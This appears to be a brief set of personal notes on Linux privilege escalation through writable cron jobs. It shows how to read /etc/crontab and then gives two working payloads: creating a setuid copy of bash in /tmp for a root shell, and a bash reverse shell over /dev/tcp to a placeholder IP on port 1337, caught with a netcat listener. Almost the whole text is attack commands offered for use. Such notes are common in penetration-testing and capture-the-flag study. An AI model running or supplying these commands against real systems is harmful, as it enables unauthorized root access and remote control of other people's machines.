# Step one is to check if crontabs are exploitable
    cat /etc/crontab

# If a cronjob is globally writeable you can edit the script to run malicious code. For example:
    spawn a root shell:
        cp /bin/bash /tmp/rootbash
        chmod +xs /tmp/rootbash

        move into /tmp/ and run rootbash
    run a reverse shell that connects to a local machine:
        bash -i >& /dev/tcp/<local_ip>/1337 0>&1

        run netcat listener on local machine and wait for cronjob to run

